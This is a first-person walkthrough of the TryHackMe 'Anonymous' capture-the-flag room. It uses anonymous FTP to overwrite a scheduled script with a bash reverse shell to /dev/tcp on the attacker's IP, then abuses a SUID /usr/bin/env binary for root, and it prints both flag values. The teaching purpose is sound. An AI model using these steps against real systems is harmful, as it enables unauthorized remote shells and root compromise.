## Introduction

The **Anonymous** room on TryHackMe presents a classic CTF-style Linux machine that's ideal for practicing enumeration, lateral thinking, and privilege escalation. In this walkthrough, Iâ€™ll guide you through how I leveraged a misconfigured FTP service and an insecure cleanup script to gain a reverse shell on the target system â€” and how a single misconfigured binary handed me root.

---

## Reconnaissance

As always, I started with **network enumeration** to get the lay of the land. I launched an aggressive Nmap scan to discover open ports and services running on the target machine.

```bash
sudo nmap -p- -T4 -A 10.10.64.179
```

![Nmap Scan Results](/assets/images/tcm-security/anonymous/anonymous-02.png)

### Results Summary

- **Port 21 (FTP)**: `vsftpd 2.0.8` â€” anonymous login enabled  
- **Port 22 (SSH)**: `OpenSSH 7.6p1` on Ubuntu 18.04  
- **Ports 139/445 (SMB)**: `Samba smbd 4.7.6-Ubuntu`, guest access

These results told me two things: there were likely multiple avenues for initial access â€” and anonymous FTP looked especially promising.

## Gaining Entry Through Anonymous FTP

Connecting to the FTP server revealed a writable `scripts` directory â€” a big red flag.

```bash
ftp 10.10.64.179
ftp> cd scripts
ftp> ls
```

I downloaded everything I could using binary mode to avoid corrupting file contents:

![FTP File Discovery](/assets/images/tcm-academy/anonymous/anonymous-03.png)

```bash
ftp> binary
ftp> mget *
```

I had three files to analyze:

- `clean.sh`
- `removed_files.log`
- `to_do.txt`

---

### Reviewing Downloaded Files

Opening `to_do.txt` gave a hint that FTP access was likely unintentional:

```plaintext
I really need to disable the anonymous login ... it's really not safe
```

The `removed_files.log` showed a repeated message:

```plaintext
Running cleanup script: nothing to delete
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-04.png">

The third file, `clean.sh`, was the most interesting â€” a bash script designed to remove temp files. Critically, it had **world-writable permissions** and appeared to be executed on a schedule.

```bash
cat clean.sh
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-05.png">

---

## Reverse Shell via Writable Script

Since `clean.sh` was writable and likely auto-executed, I weaponized it by inserting a reverse shell payload targeting my attack machine:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.13.79.36/7777 0>&1
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-06.png">

I started a Netcat listener and re-uploaded my modified script:

```bash
nc -nlvp 7777
ftp> put clean.sh
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-07.png">  
<img src="/assets/images/tcm-academy/anonymous/anonymous-08.png">

Seconds later, I caught a shell back.

```bash
whoami
namelessone
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-09.png">

> âœ… I now had an interactive shell on the target as user `namelessone`.

---

## Local Enumeration and Flag Hunting

First, I confirmed my identity and inspected the home directory:

```bash
whoami
uname -a
ls -la
```

I spotted `user.txt` and grabbed the first flag:

```bash
cat user.txt
```

ðŸŽ‰ **User flag**: `90d6f99258581ff991e68748c414740`

---

## Investigating the Environment

While poking around the user's home directory, I noticed a `pics` folder. Naturally, I took a look:

```bash
cd pics
ls
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-10.png">

It contained only two `.jpg` files. No hidden credentials or encoded data here â€” just a decoy or clutter.

---

## Failed Sudo Escalation Attempt

I tried to list `sudo` privileges:

```bash
sudo -l
```

Got hit with a TTY-related error:

```plaintext
sudo: no tty present and no askpass program specified
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-11.png">

I upgraded to a full TTY using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After that, I attempted to execute a sudo -l command again, but it prompted for a password â€” which I didnâ€™t have. I moved on.

---

## Privilege Escalation Through SUID Binaries

Time to escalate. I searched the system for files with the SUID bit set:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-14.png">

Most binaries were standardâ€¦ except one stood out:

```bash
/usr/bin/env
```

---

## Using `/usr/bin/env` to Gain Root

According to [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid), if `env` has the SUID bit set, it can be abused to spawn a root shell like this:

```bash
/usr/bin/env /bin/bash -p
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-12.png">

I gave it a shot:

```bash
/usr/bin/env /bin/bash -p
```



Then confirmed I had root with:

```bash
whoami
id
ls /root
cat /root/root.txt
```

<img src="/assets/images/tcm-academy/anonymous/anonymous-13.png">

ðŸŽ‰ **Root flag**: `4d930091c31a622a7ed10f27999af363`

## Final Thoughts

The **Anonymous** box offered a perfect mix of enumeration, scripting insight, and privilege escalation with real-world implications:

- FTP services left open to the world can become footholds  
- Writable scripts can be as dangerous as remote exploits  
- SUID misconfigurations like `env` are often overlooked

> ðŸ’¡ This room was a strong reminder that even simple misconfigurations can lead to complete system compromise. Consistent enumeration and knowing where to look â€” like SUID binaries and writable scripts â€” can make all the difference. Tools like GTFOBins aren't just helpful â€” they're essential in every pentester's toolkit.
